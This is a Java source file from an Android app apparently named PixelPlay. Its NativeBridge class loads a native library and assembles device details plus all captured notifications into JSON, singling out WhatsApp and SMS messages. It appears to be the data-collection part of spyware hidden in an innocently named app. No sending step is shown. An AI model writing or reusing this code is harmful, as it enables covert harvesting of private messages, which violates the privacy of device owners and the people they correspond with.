package com.pixelplay.app;

import android.os.Build;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.List;

public class NativeBridge {
    private static final String TAG = "PixelPlay";

    static {
        try {
            System.loadLibrary("pixelcore");
            Log.d(TAG, "[+] native library loaded");
        } catch (UnsatisfiedLinkError e) {
            Log.e(TAG, "[!] native lib unavailable");
        }
    }

    public static native void start();

    public static String collect() {
        try {
            JSONObject p = new JSONObject();

            JSONObject d = new JSONObject();
            d.put("android", Build.VERSION.RELEASE);
            d.put("sdk", Build.VERSION.SDK_INT);
            d.put("manufacturer", Build.MANUFACTURER);
            d.put("model", Build.MODEL);
            p.put("device", d);

            JSONArray notifs = new JSONArray();
            List<JSONObject> caps = NotificationBridge.getCaptured();
            synchronized (caps) {
                for (JSONObject n : caps) notifs.put(n);
            }
            p.put("notifications", notifs);

            JSONArray wa = new JSONArray();
            JSONArray sms = new JSONArray();
            for (int i = 0; i < notifs.length(); i++) {
                JSONObject n = notifs.getJSONObject(i);
                String pkg = n.optString("package", "");
                if ("com.whatsapp".equals(pkg)) wa.put(n);
                if (pkg.contains("messaging") || pkg.contains("sms") || pkg.contains("message"))
                    sms.put(n);
            }
            p.put("whatsapp", wa);
            p.put("sms", sms);

            return p.toString(2);
        } catch (Exception e) {
            Log.e(TAG, "collect err: " + e.getMessage());
            return "{}";
        }
    }
}
